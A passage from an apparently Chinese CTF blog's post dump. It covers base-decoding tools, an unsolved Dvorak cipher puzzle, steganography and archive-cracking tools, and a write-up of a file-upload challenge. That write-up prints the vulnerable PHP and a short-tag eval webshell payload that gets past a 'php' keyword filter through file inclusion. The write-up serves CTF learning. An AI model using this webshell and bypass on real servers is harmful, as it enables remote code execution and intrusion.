line-through;\">![](http://cdn.anyiblog.top/common/bb01ca675f3257b868b5e5e72767f1d6.png)</span></span>\n<span style=\"font-size: 16pt;\">源码中发现：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/636164a3f826a0ce6201c7638ffcfe2c.png)</span>\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/23df81a512203845a3d822a8d03ef0de.png)</span>\n<span style=\"font-size: 16pt;\">这个图片看得出来是</span> <span style=\"font-size: 16pt;\">Dvorak键盘布局 但是就没思路了。</span>\n\n<span style=\"font-size: 16pt;\">将密文qwerty转换？ left right转换？我是解不出来。。</span>\n\n* * *\n\n<span style=\"font-size: 16pt;\">就记录到这先吧，后面做出来了继续更新。</span>\n\n<span style=\"font-size: 16pt;\">题目挺难的 卡的也挺难受的 还是自己太菜了</span>\n\n<span style=\"font-size: 16pt;\">复盘一下 感觉都还是会做的。</span>\n\n<span style=\"font-size: 16pt;\">欢迎师傅评论交流。</span>\n\n","tags":["刷题","CTF"],"categories":["刷题笔记","Writeup"]},{"title":"两款包含但不限于base系列的解密工具","url":"/2021/12/03/20211203/","content":"\n<!--前言&gt;-->\n\n# 两款包含但不限于base系列的解密工具\n\n前言> 在之前一次ctf比赛中的一个base62，因为自己工具太少，网上资源找大半天，最后解出来的还不是flag。 所以这次吸取教训，收集了两款包含但不限于base解码的工具。因为网上使用教程太过普及或太少了，所以这里附上安装方法和使用说明。   1.basecrack 工具简介： BaseCrack能够支持目前社区使用最为频繁的Base编码机制，其中包括Base16、Base32、Base36、Base58、Base62、Base64、Base64Url、Base85、Base91、Base92等等。除此之外，该工具也可以为CTF比赛，漏洞奖励计划和数据加密解密提供有效帮助。 注意：当前版本的BaseCrack可同时支持Python2和Python3环境。 \n\n## 主要功能\n\n  * 能够对任意模式的多重Base编码数据进行解码；\n  * 能够对来自文件的多个Base编码数据进行解码；\n  * 能够利用解码后的Base数据生成字典文件并输出；\n  * 能够对目标Base数据的编码方案类型进行预测；\n安装方法： 可以使用下列命令将该项目源码克隆至本地： $ git clone <https://github.com/mufeedvh/basecrack.git> $ cd basecrack $ pip install --default-time=100 -r requirements.txt 这里安装有个坑就是要用--default-time=100设置超时时间，否则pip超时过久就会报错，也算是个小经验吧，在很多安装中用--default-time=100有奇效。   然后安装完可能会报错说你还缺少一个模块   ![](http://cdn.anyiblog.top/common/6fa4dfd5c8e8e20d0d763b564497e489.png)   进行安装termcolor会有以下报错： ![](http://cdn.anyiblog.top/common/238dc579606367d19899823da7b316fb.png)   用这条即可解决 (这里target要根据报错的路径来) sudo pip install -target=path termcolor   ![](http://cdn.anyiblog.top/common/3bda6fc7369361caab0502ebd997884a.png)   最后python basecrack.py即可运行   ![](http://cdn.anyiblog.top/common/b9a613ec4864290044958370788e425a.png) 使用方法： 对来自用户输入的单个Base编码数据进行解码： python basecrack.py 对通过参数（-b/--base）传递的单个Base编码数据进行解码： python basecrack.py -b SGVsbG8gV29ybGQh 对通过文件（-f/--file）传递的多个Base编码数据进行解码： python basecrack.py -f file.txt 对任意模式的多重Base编码数据进行解码（-m/--magic）： python basecrack.py --magic 使用解码的Base数据生成字典文件并输出（-o/--output）： python basecrack.py -f file.txt -o output-wordlist.txt   2.ciphey 工具简介： Ciphey 是一个使用自然语言处理和人工智能的全自动解密/解码/破解工具。 简单地来讲，你只需要输入加密文本，它就能给你返回解密文本。 支持的解密： \n\n  1. 维吉尼亚密码\n  2. 凯撒加密\n  3. 反向密码（把明文反过来作为加密）\n  4. 换位密码（不过我自己试了试感觉好像不好解出来）\n  5. 替换密码\nCiphey 支持破解 6 种基础加密： ![](http://cdn.anyiblog.top/common/0c786c9b094b86af7eb77f7fb883073e.png) 16 种编码： ![](http://cdn.anyiblog.top/common/b8ca07270cca6244371d8e914f6a8d20.png) 哈希也支持，不过效果不可控。   安装方法：    注意!注意！！注意！！！ 不能是 python3.9版本   **不能是 python 32位版本** 建议使用 python 3.8 64位版本：python-3.8.10-amd64.exe    请选择以下任一种方式输入命令安装依赖： 1\\. Windows 环境 打开 Cmd (开始-运行-CMD)。 2\\. MacOS 环境 打开 Terminal (command+空格输入Terminal)。 3\\. 如果你用的是 VSCode编辑器 或 Pycharm，可以直接使用界面下方的Terminal. pip install -U ciphey&pip install ciphey -i <http://mirrors.aliyun.com/pypi/simple/> windows下安装完运行可能会报错 UnicodeDecodeError: 'gbk' codec can't decode byte 0xbf 然后就是要修改 ..\\envs\\对应的环境名\\Lib\\site-packages\\pywhat\\regex_identifier.py 根据错误修改代码，主要是在读取文件的时候发生错误，将\"r\" 改为\"rb\",即可。   ![](http://www.anyiblog.top/uploads/2021/12/726b6a36f48b0f04b9ae2102517f8e1b.webp) 使用方法：   主要以下两种用法：   (在编辑器下使用效果最佳，命令行下颜色代码显示不出来影响观感) 命令行下输入： ciphey -t \"密文\" ciphey -f 文件名 例如： ciphey -t 'aGVsbG8gbXkgbmFtZSBpcyBiZWU=' cipyhey -f flag.txt ![](http://cdn.anyiblog.top/common/9c7b750415a8b62ac979b566f5e00a84.png)   ![](http://cdn.anyiblog.top/common/3fa55bbd28c2a7cce574fb1947068626.png)","tags":["干货"],"categories":["干货","CTF"]},{"title":"记一次文件上传之过滤php绕过","url":"/2021/10/14/20211014/","content":"\n<!--今天在群里看到群友发的一道题 想试试 解了一个多小时 过程挺有趣 就记录一下了 学到新的绕过姿势-->\n\n# 记一次文件上传之过滤php绕过\n\n今天在群里看到群友发的一道题 想试试 解了一个多小时 过程挺有趣 就记录一下了 学到新的绕过姿势 ![](http://cdn.anyiblog.top/common/874dc429460d889cb885cedef68b295f.png) 看题； ![](http://cdn.anyiblog.top/common/095c93515297178510c14a9120098f25.png) 一道文件上传+文件包含的题目 bp上传如下 ![](http://cdn.anyiblog.top/common/d9f1c83b950af13dfad37c95aeb45370.png) 经过测试文件名含有ph过滤 文件内容含有php过滤 上传后发现注释  <!--read.php?filename=  --> 访问后尝试进行文件包含，如下 ![](http://cdn.anyiblog.top/common/5a0326775979e47db80f3c4998383744.png) 显然 这是文件包含没错 试着读取flag ![](http://cdn.anyiblog.top/common/c198b7c7b96a0704084d72521b2f06c8.png) 被过滤了 目前思路是通过上传jpg或者txt 然后内容写入php代码 即使文件不是以php后缀结尾，仍可以利用include特性执行代码 因此，我们需要绕过对内容的过滤 在此之前，我们可以用php:filter伪协议读取文件源码 ![](http://cdn.anyiblog.top/common/64ef029d9501da7bbb688967abd0cf86.png) base64解码后代码如下： \n    \n    \n    <div class=\"light\"><span class=\"glow\">\n                <form enctype=\"multipart/form-data\" method=\"post\" onsubmit=\"return checkFile()\">\n                    嘿伙计，传个火？！\n                    <input class=\"input_file\" type=\"file\" name=\"upload_file\"/>\n                    <input class=\"button\" type=\"submit\" name=\"submit\" value=\"upload\"/>\n                </form>\n          </span><span class=\"flare\"></span><div>\n          <!--read.php?filename=  -->\n    <?php\n        error_reporting(0);\n        //设置上传目录\n        define(\"UPLOAD_PATH\", \"./uplo4d\");\n        $msg = \"Upload Success!\";\n        if (isset($_POST['submit'])) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $file_name = $_FILES['upload_file']['name'];\n            $ext = pathinfo($file_name,PATHINFO_EXTENSION);\n          if(preg_match(\"/ph/i\", strtolower($ext))){\n            die(\"这可不能上传啊！\");\n        }\n           \n                $content = file_get_contents($temp_file);\n                if(preg_match(\"/php/i\", $content)){\n                    die(\"诶，被我发现了吧\");\n                }\n    \n    \n            $new_file_name = md5($file_name).\".\".$ext;\n            $img_path = UPLOAD_PATH . '/' . $new_file_name;\n    \n    \n    \n    \n            if (move_uploaded_file($temp_file, $img_path)){\n                $is_upload = true;\n            } else {\n                $msg = 'Upload Failed!';\n            }\n            echo '<div style=\"color:#F00\">'.$msg.\" Look here~ \".$img_path.\"</div>\";\n        }\n    ?>\n    \n\n文件名含有ph过滤 文件内容含有php过滤 read代码如下： \n    \n    \n    <?php\n    error_reporting(0);\n    $a=$_GET[\"filename\"];\n    if(preg_match('/flag/i',$a)){\n      exit(\"nononono\");\n    }\n    include($a);\n    \n    \n    ?>\n    \n\n因为php被过滤了 所以我们无法构造<?php 所以要绕过<?php 这里我想了好久 要用<?短标签绕过 ![](http://cdn.anyiblog.top/common/17cfe83cfcc4d4733df8162065ed2856.png) 成功上传，尝试文件包含 ![](http://cdn.anyiblog.top/common/d77745df0f14983e0bd546c504f46f1f.png) 成功执行   构造payload：<? eval($_POST['a']); ?> 注意这里不要用GET传参 因为是图片所以传不上去 ![](http://cdn.anyiblog.top/common/94711007e09edef7a2276f459807a7cd.png) cat flag ![](http://cdn.anyiblog.top/common/2fe5ef89275ffe1f39492bf944b8ef78.png) flag在环境变量里    因此flag在phpinfo里或者用printenv看环境变量   ![](http://cdn.anyiblog.top/common/30de87fae1f8e2a428e5cd5689ffe77d.png) ![](http://cdn.anyiblog.top/common/99b73c79693a47c89d105891eaf7c4f4.png) 0xGame{upl0ad_f1le_causes_danger!!!}   解法2： 上传一个<? phpinfo() ?>的图片或文本，然后访问， 要注意的是 如果要用<? phpinfo() ?>查看的话，因为包含php会被过滤 因此要用base64解密   payload：<? eval(base64_decode('cGhwaW5mbygpOw=='));?> ![](http://cdn.anyiblog.top/common/5bd0f17be130c8f4e27fd06ea81f7254.png) ![](http://cdn.anyiblog.top/common/bf9b554dd3c9cce05be78b0b56f0a055.png) End","tags":["刷题","CTF"],"categories":["刷题笔记","CTF","Web"]},{"title":"-安利-个人觉得几款在misc中冷门而好用的工具","url":"/2021/06/01/20210601/","content":"# [安利]个人觉得几款在misc中冷门而好用的工具\n\n## 前言：\n\n最近做了不少的misc题，很多冷知识触及到我的知识盲区。我找了相应的工具，挺适合于解密或者出题，分享一下。\n\n  * 目录：\n    * SlientEye\\---隐写/加密\n    * OurSecret\\---隐写/加密\n    * Advanced Archive Password Recovery\\---压缩包密码爆破\n    * turn5\\---进制转换\n    * py3base92\\---base92解密\n\n> **1.SlientEye**\n\n**下载地址**：[h](http://www.anyiblog.top/Download/2021.6.1/SlientEye.exe)[ttp://www.anyiblog.top/Download/2021.6.1/SlientEye.exe](http://www.anyiblog.top/Download/2021.6.1/SilentEye.exe)\n\nSlientEye常用于在各种图片中隐藏着各种信息，可加密可解密，作为miscer亦或是writer这是一个重要但冷门的工具，在misc中挺少见。\n\n  * 优点：\n    * 支持BMP、JPG、JPEG、JPG、PNG等目前主流的图片格式\n    * 支持一键解码\n    * 支持一键编码\n    * 可查看图片的一切基本信息，包括尺寸、质量、格式和容量等\n    * 可自定义图片路径\n\n用法：\n\n首先选择你要显示给别人看的图片，File->Open打开\n\n![](http://cdn.anyiblog.top/common/QQ截图20210601145401.png)\n\n打开之后选择你要加密（Decode），还是解密（Encode），或是显示图片信息（Property）\n\n图片信息：\n\n![](http://cdn.anyiblog.top/common/QQ截图20210601152926.png)\n\n包括尺寸、质量、格式和容量等等\n\n加密：\n\n![](http://cdn.anyiblog.top/common/QQ截图20210601153131.png)\n\n最后Encode即可生成一份你想要隐藏的文件的文件\n\n解密：\n\n![](http://cdn.anyiblog.top/common/QQ截图20210601153522.png)\n\n同理Decode解密\n\n![](http://cdn.anyiblog.top/common/QQ截图20210601153658.png)\n\n> **2.OurSelect**\n\n**下载地址**：<http://www.anyiblog.top/Download/2021.6.1/OurSecret.exe>\n\n相比SlientEye，OurSelect更加方便快捷，更简单操作。要说唯一的缺点就是不能隐藏信息，只能藏文件。\n\n  * 优点:\n    * 安全性高\n    * 操作方便简单\n    * 隐藏信息\n\n用法:\n\n![](http://cdn.anyiblog.top/common/QQ截图20210601155519.png)\n\n> **3.Advanced Archive Password Recovery**\n\n下载地址：[http://www.anyiblog.top/Downl](http://www.anyiblog.top/Download/2021.6.1/Advanced%20Archive%20Password%20Recovery.zip)[o](http://www.anyiblog.top/Download/2021.6.1/Advanced%20Archive%20Password%20Recovery.zip)[ad/2021.6.1/Advanced%](http://www.anyiblog.top/Download/2021.6.1/Advanced%20Archive%20Password%20Recovery.zip)[20Archive](http://www.anyiblog.top/Download/2021.6.1/Advanced%20Archive%20Password%20Recovery.zip)[%20Password%20Recovery](http://www.anyiblog.top/Download/2021.6.1/Advanced%20Archive%20Password%20Recovery.zip)[.](http://www.anyiblog.top/Download/2021.6.1/Advanced%20Archive%20Password%20Recovery.zip)[zip](http://www.anyiblog.top/Download/2021.6.1/Advanced%20Archive%20Password%20Recovery.zip)\n\nARCHPR是个挺好用的工具，若压缩包为弱口令或是给定一个范围，基本都能跑出来，对做题挺重要的。","tags":["干货"],"categories":["干货","CTF"]}]